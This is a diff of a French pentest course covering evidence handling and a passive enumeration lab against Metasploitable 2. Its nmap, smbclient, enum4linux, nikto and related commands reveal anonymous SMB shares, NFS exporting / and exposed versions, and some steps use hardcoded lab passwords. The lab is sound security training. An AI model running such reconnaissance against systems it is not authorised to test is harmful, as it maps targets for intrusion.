+- `-o StrictHostKeyChecking=no` et `-o UserKnownHostsFile=/dev/null` : évitent l'invite d'empreinte SSH.
+- `-r` : copie récursivement.
+- `kali@192.168.56.101:/home/kali/preuves/ch1-lab4/.` : source ; le `/.` copie le contenu du répertoire, pas le répertoire lui-même.
+- `preuves/ch1-lab4/` : destination sur l'hôte.
+- `ls ... | head` : vérifie les premiers fichiers copiés.
+- Piège courant : omettre `/.` et créer un sous-répertoire `ch1-lab4/ch1-lab4`.
 
-**Étape 12** — Consolider l'inventaire hôte + Kali.
+**Résultat attendu**
 
-Sur l'hôte, dans la racine du dépôt :
+Les fichiers de Kali sont présents dans `preuves/ch1-lab4/` sur l'hôte, sans écraser les preuves de l'hôte.
+
+**Preuve** — contenu de `preuves/ch1-lab4/` sur l'hôte.
+
+#### Étape 12 — Consolider l'inventaire hôte + Kali
+
+**But** — produire une liste unique des preuves de l'hôte et de Kali, avec un préfixe distinct pour les chemins distants.
+
+**Machine** — hôte d'hypervision, `192.168.56.1`, vers Kali `192.168.56.101`.
+
+**Prérequis** — preuves Kali copiées à l'étape 11 ; accès SSH à Kali.
+
+> **Machine** : hôte (192.168.56.1) | **Terminal** : terminal local | **Utilisateur** : utilisateur du dépôt | **Répertoire** : racine du dépôt
+
+**Exemple de commande**
 
 ```bash
 { echo "# date: $(date -Is)"; echo "# cmd: inventaire consolide hote + Kali";
@@ -1756,11 +2472,38 @@ Sur l'hôte, dans la racine du dépôt :
 grep -v '^#' preuves/ch1-lab4/INVENTAIRE-GLOBAL.log > preuves/ch1-lab4/INVENTAIRE-GLOBAL.txt
 ```
 
-Résultat attendu : une liste unique, avec les chemins de l'hôte et les chemins Kali préfixés `kali:`. Le fichier ne doit contenir ni `Warning: Permanently added` ni sa propre ligne. Si c'est le cas, utilisez `ssh -q` et excluez le fichier de sortie.
+**Explication de la commande**
 
-**Explication de la commande** — L'inventaire consolidé préfixe les chemins Kali par `kali:`. `ssh -q` supprime l'avertissement `Permanently added`. Le fichier ne doit contenir que des chemins. Si un avertissement apparaît, il vient de `stderr` : redirigez-le ou utilisez `-q`.
+- `{ ...; }` : groupe les commandes pour leur appliquer une redirection commune.
+- `echo "# date: $(date -Is)"` : écrit un en-tête horodaté au format ISO 8601.
+- `echo "# cmd: ..."` : écrit l'en-tête de commande.
+- `find preuves -type f ...` : liste les fichiers de l'hôte en excluant les deux fichiers d'inventaire.
+- `sshpass -p kali ssh -q ... kali@192.168.56.101 'find /home/kali/preuves -type f'` : liste les fichiers de Kali à distance.
+- `| sed 's|^/home/kali/|kali:|'` : préfixe les chemins distants par `kali:`.
+- `| sort` : trie la liste consolidée.
+- `echo "# rc=${PIPESTATUS[0]}"` : ajoute le code retour de la première commande du pipeline précédent.
+- `2>&1 | tee ...` : redirige la sortie standard et les erreurs vers `tee`, qui affiche et écrit le journal.
+- `grep -v '^#'` : retire les lignes d'en-tête pour produire la liste finale.
+- `> ... INVENTAIRE-GLOBAL.txt` : écrit la liste nettoyée.
+- Piège courant : ne pas exclure le fichier de sortie ; il s'inclut lui-même. Un avertissement `Permanently added` vient de `stderr` ; `ssh -q` le supprime.
 
-**Étape 13** — Geler les preuves.
+**Résultat attendu**
+
+Une liste unique, avec les chemins de l'hôte et les chemins Kali préfixés `kali:`. Le fichier ne doit contenir ni `Warning: Permanently added` ni sa propre ligne.
+
+**Preuve** — `preuves/ch1-lab4/INVENTAIRE-GLOBAL.log` et `preuves/ch1-lab4/INVENTAIRE-GLOBAL.txt`.
+
+#### Étape 13 — Geler les preuves
+
+**But** — calculer les empreintes des preuves du lab et vérifier leur intégrité.
+
+**Machine** — hôte d'hypervision, `192.168.56.1`.
+
+**Prérequis** — preuves de l'hôte et de Kali présentes dans `preuves/ch1-lab4/`.
+
+> **Machine** : hôte (192.168.56.1) | **Terminal** : terminal local | **Utilisateur** : utilisateur du dépôt | **Répertoire** : racine du dépôt
+
+**Exemple de commande**
 
 ```bash
 sha256sum preuves/ch1-lab4/*.txt preuves/ch1-lab4/*.pcap preuves/ch1-lab4/*.typescript \
@@ -1768,13 +2511,28 @@ sha256sum preuves/ch1-lab4/*.txt preuves/ch1-lab4/*.pcap preuves/ch1-lab4/*.type
 sha256sum -c preuves/ch1-lab4/SHA256SUMS
 ```
 
-Résultat attendu : une ligne `OK` par fichier. Le fichier `SHA256SUMS` ne s'inclut pas lui-même.
+**Explication de la commande**
 
-**Explication de la commande** — `sha256sum -c` vérifie l'intégrité. Le fichier `SHA256SUMS` est créé après les autres et ne s'inclut pas. Piège courant : le recréer après vérification, ce qui change son contenu et invalide la vérification précédente.
+- `sha256sum` : calcule l'empreinte SHA-256 de chaque fichier correspondant aux motifs.
+- `preuves/ch1-lab4/*.txt` : preuves texte.
+- `preuves/ch1-lab4/*.pcap` : capture réseau.
+- `preuves/ch1-lab4/*.typescript` : session brute.
+- `> preuves/ch1-lab4/SHA256SUMS` : écrit les empreintes dans le fichier de sommes.
+- `sha256sum -c` : vérifie chaque fichier contre le fichier de sommes ; `OK` signifie que l'empreinte correspond.
+- Le fichier `SHA256SUMS` est créé après les autres et ne s'inclut pas lui-même.
+- Piège courant : recréer `SHA256SUMS` après vérification ; son contenu change et invalide la vérification précédente.
 
-**Conclusion.** Vous avez une baseline, un snapshot, une session, une capture, quatre fiches dry-run, un journal et un inventaire consolidé. Le Lab-05 approfondit chaque service de Metasploitable 2 avec les outils du chapitre.
+**Résultat attendu**
 
-### 9.5 Résultats attendus
+Une ligne `OK` par fichier.
+
+**Preuve** — `preuves/ch1-lab4/SHA256SUMS`.
+
+### En conclusion
+
+Vous avez une baseline, un snapshot, une session, une capture, quatre fiches dry-run, un journal et un inventaire consolidé. Le Lab-05 approfondit chaque service de Metasploitable 2 avec les outils du chapitre.
+
+**Résultats attendus**
 
 | Élément | Valeur attendue |
 |---|---|
@@ -1789,7 +2547,7 @@ Résultat attendu : une ligne `OK` par fichier. Le fichier `SHA256SUMS` ne s'inc
 | Inventaire | sans auto-inclusion |
 | Sommes | `sha256sum -c` OK |
 
-### 9.6 Critères de réussite
+**Critères de réussite**
 
 - [ ] Les trois baselines sont enregistrées avec `# date:`, `# cmd:`, `# rc=`.
 - [ ] Le noyau exact de Meta est lu dans la VM, pas deviné par Nmap.
@@ -1802,15 +2560,16 @@ Résultat attendu : une ligne `OK` par fichier. Le fichier `SHA256SUMS` ne s'inc
 - [ ] L'inventaire ne s'inclut pas lui-même.
 - [ ] `sha256sum -c` retourne `OK` pour chaque fichier.
 
-## 10. Lab-05 — Énumération approfondie des services de Metasploitable 2
+## Lab-05 — Énumération approfondie des services de Metasploitable 2
 
-### 10.1 Contexte et objectif
+### Énoncé / Contexte
 
 Le Lab-01 a donné une liste de ports et de versions. Ce lab transforme cette liste en **connaissance opérationnelle** : pour chaque service, quel outil confirme le service, quelle information est accessible sans authentification, quelle information exige un compte de test, et quelle preuve est conservée.
 
 **Place dans la chaîne** — après la baseline (Lab-04), avant la validation CVE et la matrice de risques (Lab-06).
 
-À la fin de ce lab, vous devez être capable de :
+**Objectifs pédagogiques** — à la fin de ce lab, vous devez être capable de :
+
 - choisir l'outil adapté à chaque famille de services ;
 - distinguer une bannière, une version, une configuration et une vulnérabilité ;
 - expliquer pourquoi un script NSE vide ne prouve pas l'absence de service ;
@@ -1819,19 +2578,7 @@ Le Lab-01 a donné une liste de ports et de versions. Ce lab transforme cette li
 
 > **Périmètre** — ce lab est **passif et de vérification**. Aucune authentification par force brute, aucune exécution de commande distante, aucun accès au shell root `1524`, aucune modification de configuration. Les comptes de test `msfadmin` et `postgres` sont utilisés uniquement pour lire une version ou une bannière, jamais pour élever les privilèges.
 
-**Outils et commandes utilisées**
-
-| Outil | Commandes | Rôle |
-|---|---|---|
-| `curl`, `ftp` | `curl -v ftp://...`, `curl -D -` | FTP anonyme et en-têtes HTTP |
-| `ssh`, `nc`, `dig` | bannière SSH, Telnet/SMTP/IRC, `dig version.bind` | Énumération des services |
-| `nmap` | `-sV`, `--script smb-enum-shares,vnc-info,...` | Versions et scripts NSE ciblés |
-| `smbclient`, `enum4linux`, `nbtscan` | `smbclient -L`, `enum4linux -a` | Énumération SMB/NetBIOS |
-| `showmount`, `rpcinfo`, `mysql`, `psql` | `showmount -e`, `SELECT VERSION()` | NFS, RPC et bases de données |
-| `nikto`, `whatweb`, `gobuster` | `nikto -h`, `whatweb`, `gobuster dir` | Surface web |
-| `xdpyinfo` | `xdpyinfo -display 192.168.56.103:0` | Test X11 non authentifié |
-
-### 10.2 Plan MITRE ATT&CK
+**Plan MITRE ATT&CK**
 
 | Élément | Valeur |
 |---|---|
@@ -1842,7 +2589,7 @@ Le Lab-01 a donné une liste de ports et de versions. Ce lab transforme cette li
 | Contrôle défensif | Réduction de surface, authentification forte, segmentation, journalisation |
 | Détection | Connexions vers plusieurs services depuis un même hôte, échecs d'authentification, requêtes DNS AXFR |
 
-### 10.3 Prérequis
+**Prérequis**
 
 - Metasploitable 2 démarré et joignable sur `192.168.56.103`.
 - Kali avec `nmap`, `curl`, `dig`, `nc`, `ftp`, `ssh`, `smbclient`, `enum4linux`, `nbtscan`, `showmount`, `rpcinfo`, `mysql`, `psql`, `xdpyinfo`, `nikto`, `whatweb`, `gobuster`.
@@ -1855,7 +2602,7 @@ Le Lab-01 a donné une liste de ports et de versions. Ce lab transforme cette li
 
 > **Convention de nommage** — un fichier de preuve par service et par outil : `ftp-anon.txt`, `ssh-banner.txt`, `smb-shares.txt`, etc. Le nom du fichier doit permettre de retrouver la commande sans ouvrir le contenu.
 
-### 10.4 Matrice de couverture
+**Matrice de couverture**
 
 | Service | Port(s) | Outil principal | Commande de référence | Preuve | ATT&CK |
 |---|---|---|---|---|---|
@@ -1881,9 +2628,31 @@ Le Lab-01 a donné une liste de ports et de versions. Ce lab transforme cette li
 | r-services | 512-514 | `nmap` | `nmap -sV -p 512,513,514` | `rservices.txt` | T1046 |
 | bindshell | 1524 | `nmap` | `nmap -sV -p 1524` | `bindshell-version.txt` | T1046 |
 
-### 10.5 Étapes
+### Outils et commandes utilisées
 
-#### 10.5.1 FTP — ports 21 et 2121
+| Outil | Commande | Rôle |
+|---|---|---|
+| `curl`, `ftp` | `curl -v ftp://...`, `curl -D -` | FTP anonyme et en-têtes HTTP |
+| `ssh`, `nc`, `dig` | bannière SSH, Telnet/SMTP/IRC, `dig version.bind` | Énumération des services |
+| `nmap` | `-sV`, `--script smb-enum-shares,vnc-info,...` | Versions et scripts NSE ciblés |
+| `smbclient`, `enum4linux`, `nbtscan` | `smbclient -L`, `enum4linux -a` | Énumération SMB/NetBIOS |
+| `showmount`, `rpcinfo`, `mysql`, `psql` | `showmount -e`, `SELECT VERSION()` | NFS, RPC et bases de données |
+| `nikto`, `whatweb`, `gobuster` | `nikto -h`, `whatweb`, `gobuster dir` | Surface web |
+| `xdpyinfo` | `xdpyinfo -display 192.168.56.103:0` | Test X11 non authentifié |
+
+### Commande et laboratoire étape par étape
+
+#### Étape 1 — FTP, ports 21 et 2121
+
+**But** — vérifier si le FTP accepte un login anonyme et identifier le service alternatif exposé sur le port 2121.
+
+**Machine** — Kali `192.168.56.101` vers Metasploitable 2 `192.168.56.103`.
+
+**Prérequis** — `curl`, `nmap` et accès `sudo` sur Kali ; service FTP actif sur la cible.
+
+> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali`
+
+**Exemple de commande**
 
 ```bash
 prouve preuves/ch1-lab5/ftp-anon.txt bash -c \
@@ -1892,7 +2661,19 @@ prouve preuves/ch1-lab5/ftp-alt-version.txt bash -c \
   "echo kali | sudo -S -p '' nmap -sV -n -p 2121 192.168.56.103"
 ```
 
-Résultat attendu (extrait réel) :
+**Explication de la commande**
+
+- `prouve ... ftp-anon.txt` : enregistre la tentative de login anonyme et son code retour.
+- `curl --max-time 10` : borne la connexion à 10 secondes.
+- `-sS` : mode silencieux, mais affichage des erreurs.
+- `-v` : mode verbeux, qui montre les commandes et réponses FTP.
+- `ftp://anonymous:anonymous@192.168.56.103/` : connexion FTP avec le compte anonyme.
+- `prouve ... ftp-alt-version.txt` : enregistre l'identification du service sur le port 2121.
+- `echo kali | sudo -S -p ''` : fournit le mot de passe à `sudo`.
+- `nmap -sV -n -p 2121` : détection de version sur le port alternatif, sans résolution DNS.
+- Piège courant : considérer le login anonyme comme une vulnérabilité en soi ; c'est une configuration, qui devient un risque si elle expose des fichiers sensibles ou une version vulnérable.
+
+**Résultat attendu**
 
 ```text
 < 220 (vsFTPd 2.3.4)
@@ -1905,9 +2686,21 @@ Résultat attendu (extrait réel) :
 < 226 Directory send OK.
 ```
 
-**Explication de la commande** — le login anonyme est autorisé sur le port 21. Le répertoire racine est vide dans notre test. Le port 2121 expose ProFTPD `1.3.1`. Le FTP anonyme est une **configuration**, pas une vulnérabilité en soi ; il devient un risque s'il expose des fichiers sensibles ou une version vulnérable.
+Le login anonyme est autorisé sur le port 21. Le répertoire racine est vide dans notre test. Le port 2121 expose ProFTPD `1.3.1`.
 
-#### 10.5.2 SSH — port 22
+**Preuve** — `preuves/ch1-lab5/ftp-anon.txt` et `preuves/ch1-lab5/ftp-alt-version.txt`.
+
+#### Étape 2 — SSH, port 22
+
+**But** — relever la bannière et les algorithmes SSH sans tenter d'authentification.
+
+**Machine** — Kali `192.168.56.101` vers Metasploitable 2 `192.168.56.103`.
+
+**Prérequis** — client `ssh`, `nmap` et accès `sudo`.
+
+> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali`
+
+**Exemple de commande**
 
 ```bash
 prouve preuves/ch1-lab5/ssh-banner.txt bash -c \
@@ -1918,16 +2711,42 @@ prouve preuves/ch1-lab5/ssh-algos.txt bash -c \
   "echo kali | sudo -S -p '' nmap -sV -n -p 22 --script ssh2-enum-algos,ssh-hostkey 192.168.56.103"
 ```
 
-Résultat attendu (extrait réel) :
+**Explication de la commande**
+
+- `prouve ... ssh-banner.txt` : enregistre la tentative de connexion et son code retour.
+- `timeout 8` : borne la connexion à 8 secondes.
+- `ssh` : client OpenSSH.
+- `-oHostKeyAlgorithms=+ssh-rsa` et `-oPubkeyAcceptedAlgorithms=+ssh-rsa` : autorisent les algorithmes anciens de la cible.
+- `-oBatchMode=yes` : interdit toute invite interactive.
+- `-oPreferredAuthentications=none` : demande aucune méthode d'authentification, pour observer la réponse.
+- `-oStrictHostKeyChecking=no` et `-oUserKnownHostsFile=/dev/null` : évitent l'invite d'empreinte.
+- `msfadmin@192.168.56.103 true` : compte de test et commande immédiatement terminée.
+- `prouve ... ssh-algos.txt` : enregistre les algorithmes et la clé d'hôte via Nmap.
+- `nmap --script ssh2-enum-algos,ssh-hostkey` : scripts NSE d'énumération SSH.
+- Piège courant : lancer une force brute ; ce lab vérifie la surface, il ne teste pas les mots de passe.
+
+**Résultat attendu**
 
 ```text
 msfadmin@192.168.56.103: Permission denied (publickey,password).
 # rc=255
 ```
 
-**Explication de la commande** — la bannière et les algorithmes sont visibles, mais l'authentification échoue sans identifiant. `rc=255` est attendu. Ne lancez pas de force brute : ce lab vérifie la surface, il ne teste pas les mots de passe.
+La bannière et les algorithmes sont visibles, mais l'authentification échoue sans identifiant. `rc=255` est attendu.
 
-#### 10.5.3 Telnet — port 23
+**Preuve** — `preuves/ch1-lab5/ssh-banner.txt` et `preuves/ch1-lab5/ssh-algos.txt`.
+
+#### Étape 3 — Telnet, port 23
+
+**But** — identifier le service Telnet et observer ses octets de négociation sans fournir d'identifiant.
+
+**Machine** — Kali `192.168.56.101` vers Metasploitable 2 `192.168.56.103`.
+
+**Prérequis** — `nmap`, `nc`, `xxd` et accès `sudo`.
+
+> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali`
+
+**Exemple de commande**
 
 ```bash
 prouve preuves/ch1-lab5/telnet-nmap-version.txt bash -c \
@@ -1936,7 +2755,19 @@ prouve preuves/ch1-lab5/telnet-negotiation.txt bash -c \
   "timeout 8 bash -c 'printf \"\\r\\n\" | nc -w 3 192.168.56.103 23' | xxd | head -5"
 ```
 
-Résultat attendu (extrait réel) :
+**Explication de la commande**
+
+- `prouve ... telnet-nmap-version.txt` : enregistre l'identification Nmap.
+- `nmap -sV -n -p 23` : détection de version sur le port Telnet.
+- `prouve ... telnet-negotiation.txt` : enregistre les octets renvoyés par le service.
+- `printf "\\r\\n"` : envoie un retour chariot et un saut de ligne.
+- `nc -w 3` : connexion TCP avec délai d'attente de 3 secondes.
+- `| xxd` : affiche les octets en hexadécimal.
+- `| head -5` : limite l'affichage aux cinq premières lignes.
+- `ff fd` : négociation Telnet `IAC DO`.
+- Piège courant : se connecter avec un compte réel ; Telnet transmet les identifiants en clair.
+
+**Résultat attendu**
 
 ```text
 PORT   STATE SERVICE VERSION
@@ -1945,16 +2776,38 @@ PORT   STATE SERVICE VERSION
 00000000: fffd 18ff fd20 fffd 23ff fd27            ..... ..#..'
 ```
 
-Les octets `ff fd` sont des négociations Telnet (IAC DO). Le service n'envoie pas de bannière textuelle avant négociation. La version fiable est `Linux telnetd` via Nmap. Ne vous connectez pas avec un compte réel : Telnet transmet les identifiants en clair.
+Les octets `ff fd` sont des négociations Telnet (IAC DO). Le service n'envoie pas de bannière textuelle avant négociation. La version fiable est `Linux telnetd` via Nmap.
 
-#### 10.5.4 SMTP — port 25
+**Preuve** — `preuves/ch1-lab5/telnet-nmap-version.txt` et `preuves/ch1-lab5/telnet-negotiation.txt`.
+
+#### Étape 4 — SMTP, port 25
+
+**But** — relever la bannière SMTP et les extensions annoncées par le serveur, sans énumérer de comptes.
+
+**Machine** — Kali `192.168.56.101` vers Metasploitable 2 `192.168.56.103`.
+
+**Prérequis** — `nc` installé sur Kali ; service SMTP actif.
+
+> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali`
+
+**Exemple de commande**
 
 ```bash
 prouve preuves/ch1-lab5/smtp-banner.txt bash -c \
   "timeout 8 bash -c 'printf \"EHLO lab.local\\r\\nQUIT\\r\\n\" | nc -w 3 192.168.56.103 25'"
 ```
 
-Résultat attendu (extrait réel) :
+**Explication de la commande**
+
+- `prouve ... smtp-banner.txt` : enregistre la bannière et son code retour.
+- `timeout 8` : borne la session à 8 secondes.
+- `bash -c '...'` : exécute la séquence dans un shell enfant.
+- `printf "EHLO lab.local\\r\\nQUIT\\r\\n"` : envoie la salutation SMTP puis la commande de sortie.
+- `nc -w 3` : connexion TCP avec délai d'attente de 3 secondes.
+- `192.168.56.103 25` : adresse et port SMTP de la cible.
+- Piège courant : utiliser `VRFY` pour énumérer des comptes ; la bannière suffit à documenter le service.
+
+**Résultat attendu**
 
 ```text
 220 metasploitable.localdomain ESMTP Postfix (Ubuntu)
@@ -1969,9 +2822,21 @@ Résultat attendu (extrait réel) :
 221 2.0.0 Bye
 ```
 
-**Explication de la commande** — Postfix accepte `EHLO`, annonce `STARTTLS` et `VRFY`. La commande `VRFY` peut révéler des comptes, mais ce lab ne l'utilise pas pour énumérer des utilisateurs. La bannière suffit à documenter le service.
+Postfix accepte `EHLO`, annonce `STARTTLS` et `VRFY`. La commande `VRFY` peut révéler des comptes, mais ce lab ne l'utilise pas pour énumérer des utilisateurs.
 
-#### 10.5.5 DNS — port 53
+**Preuve** — `preuves/ch1-lab5/smtp-banner.txt`.
+
+#### Étape 5 — DNS, port 53
+
+**But** — relever la version BIND, tester une résolution directe et vérifier que le transfert de zone est refusé.
+
+**Machine** — Kali `192.168.56.101` vers Metasploitable 2 `192.168.56.103`.
+
+**Prérequis** — `dig` installé sur Kali ; service DNS actif.
+
+> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali`
+
+**Exemple de commande**
 
 ```bash
 prouve preuves/ch1-lab5/dns-version.txt dig @192.168.56.103 version.bind chaos txt +short
@@ -1979,7 +2844,20 @@ prouve preuves/ch1-lab5/dns-query.txt dig @192.168.56.103 metasploitable.localdo
 prouve preuves/ch1-lab5/dns-axfr.txt dig @192.168.56.103 localdomain AXFR +time=5 +tries=1
 ```
 
-Résultat attendu (extrait réel) :
+**Explication de la commande**
+
+- `prouve ... dns-version.txt` : enregistre la requête de version.
+- `dig @192.168.56.103` : interroge directement le serveur DNS de la cible.
+- `version.bind chaos txt` : requête spéciale qui retourne souvent la version du serveur.
+- `+short` : sortie compacte.
+- `prouve ... dns-query.txt` : enregistre la résolution du nom de la cible.
+- `metasploitable.localdomain A` : demande l'enregistrement IPv4.
+- `prouve ... dns-axfr.txt` : enregistre la tentative de transfert de zone.
+- `localdomain AXFR` : demande un transfert complet de zone.
+- `+time=5 +tries=1` : limite le délai à 5 secondes et à une tentative.
+- Piège courant : interpréter `Transfer failed` comme une vulnérabilité ; un AXFR refusé est la configuration attendue.
+
+**Résultat attendu**
 
 ```text
 "9.4.2"
@@ -1987,9 +2865,21 @@ Résultat attendu (extrait réel) :
 ; Transfer failed.
 ```
 
-**Explication de la commande** — la version BIND `9.4.2` est exposée via `version.bind`. La requête A directe ne retourne rien. Le transfert de zone AXFR est refusé (`Transfer failed`), ce qui est la configuration attendue. Un AXFR réussi serait une fuite d'information ; un AXFR refusé n'est pas une vulnérabilité.
+La version BIND `9.4.2` est exposée via `version.bind`. La requête A directe ne retourne rien. Le transfert de zone AXFR est refusé, ce qui est la configuration attendue. Un AXFR réussi serait une fuite d'information ; un AXFR refusé n'est pas une vulnérabilité.
 
-#### 10.5.6 HTTP — port 80
+**Preuve** — `preuves/ch1-lab5/dns-version.txt`, `dns-query.txt` et `dns-axfr.txt`.
+
+#### Étape 6 — HTTP, port 80
+
+**But** — relever les en-têtes, la technologie, les répertoires exposés et les mauvaises configurations du serveur web principal.
+
+**Machine** — Kali `192.168.56.101` vers Metasploitable 2 `192.168.56.103`.
+
+**Prérequis** — `curl`, `whatweb`, `nikto`, `gobuster` et la wordlist `/usr/share/dirb/wordlists/common.txt`.
+
+> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali`
+
+**Exemple de commande**
 
 ```bash
 prouve preuves/ch1-lab5/http-curl.txt bash -c \
@@ -2003,7 +2893,24 @@ prouve preuves/ch1-lab5/gobuster-80.txt bash -c \
    --no-progress --no-color"
 ```
 
-Résultat attendu (extraits réels) :
+**Explication de la commande**
+
+- `prouve ... http-curl.txt` : enregistre les en-têtes HTTP.
+- `curl --max-time 10 -sS -D -` : affiche les en-têtes de réponse sur la sortie standard.
+- `-o /dev/null` : supprime le corps de la réponse.
+- `prouve ... whatweb-80.txt` : enregistre la technologie détectée.
+- `whatweb -a 3` : niveau d'agressivité 3.
+- `--color=never` : sortie sans séquences ANSI.
+- `prouve ... nikto-80.txt` : enregistre le scan de mauvaises configurations.
+- `timeout 100` : borne le scan à 100 secondes.
+- `nikto -h ... -nointeractive -maxtime 80s -Display V` : scan HTTP non interactif, limité à 80 secondes, avec affichage détaillé.
+- `sed -r 's/...//g'` : supprime les séquences ANSI.
+- `prouve ... gobuster-80.txt` : enregistre l'énumération de répertoires.
+- `gobuster dir -u ... -w ...` : énumération de chemins avec la wordlist.
+- `-t 20` : vingt threads ; `--timeout 5s` : délai par requête ; `--no-progress --no-color` : sortie lisible.
+- Piège courant : utiliser `whatweb --no-colour`, option absente dans la version testée ; utilisez `--color=never`.
+
+**Résultat attendu**
 
 ```text
 HTTP/1.1 200 OK
@@ -2021,11 +2928,23 @@ phpinfo.php          (Status: 200) [Size: 48026]
 test                 (Status: 301) [--> http://192.168.56.103/test/]
 ```
 
-**Explication de la commande** — Apache `2.2.8`, PHP `5.2.4`, WebDAV activé, `phpinfo.php` accessible, `TRACE` actif. `phpinfo.php` expose la configuration PHP : c'est une fuite d'information. `TRACE` peut faciliter XST (Cross-Site Tracing) ; c'est un en-tête à désactiver. `nikto` signale aussi des en-têtes de sécurité absents. L'énumération reste passive ; tous les exploits sont exécutés dans le lab sans limitation (Lab-07).
+Apache `2.2.8`, PHP `5.2.4`, WebDAV activé, `phpinfo.php` accessible, `TRACE` actif. `phpinfo.php` expose la configuration PHP : c'est une fuite d'information. `TRACE` peut faciliter XST (Cross-Site Tracing) ; c'est un en-tête à désactiver. `nikto` signale aussi des en-têtes de sécurité absents.
 
 > **Attention** — `whatweb --no-colour` n'existe pas dans la version testée. Utilisez `--color=never`. Si vous voyez `unrecognized option '--no-colour'`, la preuve est invalide : relancez la commande.
 
-#### 10.5.7 RPC et NFS — ports 111 et 2049
+**Preuve** — `preuves/ch1-lab5/http-curl.txt`, `whatweb-80.txt`, `nikto-80.txt` et `gobuster-80.txt`.
+
+#### Étape 7 — RPC et NFS, ports 111 et 2049
+
+**But** — identifier les services RPC et vérifier la liste des exports NFS sans monter aucun partage.
+
+**Machine** — Kali `192.168.56.101` vers Metasploitable 2 `192.168.56.103`.
+
+**Prérequis** — `rpcinfo`, `showmount`, `nmap` et accès `sudo`.
+
+> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali`
+
+**Exemple de commande**
 
 ```bash
 prouve preuves/ch1-lab5/rpcinfo.txt rpcinfo -p 192.168.56.103
@@ -2034,7 +2953,17 @@ prouve preuves/ch1-lab5/nfs-showmount.txt bash -c \
   "echo kali | sudo -S -p '' nmap -sV -n -p 2049 --script nfs-showmount 192.168.56.103"
 ```
 
-Résultat attendu (extraits réels) :
+**Explication de la commande**
+
+- `prouve ... rpcinfo.txt` : enregistre la liste des services RPC.
+- `rpcinfo -p 192.168.56.103` : interroge le portmapper de la cible.
+- `prouve ... showmount.txt` : enregistre les exports NFS.
+- `showmount -e 192.168.56.103` : affiche la liste des exports.
+- `prouve ... nfs-showmount.txt` : enregistre le script NSE.
+- `nmap --script nfs-showmount` : tente l'énumération NFS par script.
+- Piège courant : monter l'export pour vérifier ; le lab se limite à la lecture de la liste. Le script NSE peut ne rien retourner, `showmount -e` reste la source fiable.
+
+**Résultat attendu**
 
 ```text
 program vers proto   port  service
@@ -2046,9 +2975,21 @@ Export list for 192.168.56.103:
 / *
 ```
 
-**Explication de la commande** — NFS exporte `/` à tout le monde (`*`). C'est une configuration à risque : tout hôte du réseau peut monter l'export. Le script NSE `nfs-showmount` ne produit aucune sortie dans notre test ; `showmount -e` est la source fiable. Ne montez pas l'export : le lab se limite à la vérification.
+NFS exporte `/` à tout le monde (`*`). C'est une configuration à risque : tout hôte du réseau peut monter l'export. Le script NSE `nfs-showmount` ne produit aucune sortie dans notre test.
 
-#### 10.5.8 SMB et NetBIOS — ports 139 et 445
+**Preuve** — `preuves/ch1-lab5/rpcinfo.txt`, `showmount.txt` et `nfs-showmount.txt`.
+
+#### Étape 8 — SMB et NetBIOS, ports 139 et 445
+
+**But** — identifier le groupe de travail, les partages et les accès anonymes SMB, tout en documentant l'échec de `smbmap`.
+
+**Machine** — Kali `192.168.56.101` vers Metasploitable 2 `192.168.56.103`.
+
+**Prérequis** — `nbtscan`, `smbclient`, `nmap`, `enum4linux`, `smbmap` et accès `sudo`.
+
+> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali`
+
+**Exemple de commande**
 
 ```bash
 prouve preuves/ch1-lab5/nbtscan.txt nbtscan -v 192.168.56.103
@@ -2061,7 +3002,22 @@ prouve preuves/ch1-lab5/smbmap.txt bash -c \
   "timeout 40 smbmap -H 192.168.56.103 -u guest -p guest"
 ```
 
-Résultat attendu (extraits réels) :
+**Explication de la commande**
+
+- `prouve ... nbtscan.txt` : enregistre la découverte NetBIOS.
+- `nbtscan -v` : interroge les noms NetBIOS de la cible.
+- `prouve ... smbclient-list.txt` : enregistre la liste des partages.
+- `smbclient -L //192.168.56.103 -N` : liste les partages sans mot de passe.
+- `prouve ... smb-shares.txt` : enregistre l'énumération Nmap.
+- `nmap --script smb-os-discovery,smb-enum-shares` : scripts NSE de découverte SMB.
+- `prouve ... enum4linux.txt` : enregistre l'énumération complète.
+- `timeout 180 enum4linux -a` : énumération complète, bornée à 180 secondes.
+- `2>&1 | sed -r 's/...//g'` : capture les erreurs et supprime les séquences ANSI.
+- `prouve ... smbmap.txt` : enregistre la tentative `smbmap`.
+- `timeout 40 smbmap -H ... -u guest -p guest` : test d'accès avec le compte invité, borné à 40 secondes.
+- Piège courant : conclure à l'absence de partages sur l'échec de `smbmap` ; `smbclient -L` et Nmap restent les sources de repli.
+
+**Résultat attendu**
 
 ```text
 Anonymous login successful
@@ -2076,7 +3032,7 @@ WORKGROUP  METASPLOITABLE
 \\192.168.56.103\tmp:  Anonymous access: READ/WRITE
 ```
 
-**Explication de la commande** — SMB `3.0.20-Debian`, groupe `WORKGROUP`, partages `tmp` et `IPC$` accessibles en anonyme avec `READ/WRITE`. `enum4linux -a` confirme le domaine, les utilisateurs et les partages, mais met environ 40 secondes et produit des séquences ANSI. `smbmap` échoue dans notre environnement :
+SMB `3.0.20-Debian`, groupe `WORKGROUP`, partages `tmp` et `IPC$` accessibles en anonyme avec `READ/WRITE`. `enum4linux -a` confirme le domaine, les utilisateurs et les partages, mais met environ 40 secondes et produit des séquences ANSI. `smbmap` échoue dans notre environnement :
 
 ```text
 multiprocessing.pool.MaybeEncodingError: Error sending result: ...
@@ -2086,45 +3042,112 @@ PicklingError("Can't pickle local object ...")
 
 Ce n'est pas une absence de partages : c'est une incompatibilité entre `smbmap 1.10.7` et Python 3.14. Le fallback est `smbclient -L` et `nmap --script smb-enum-shares`. Documentez l'échec, ne supprimez pas la preuve.
 
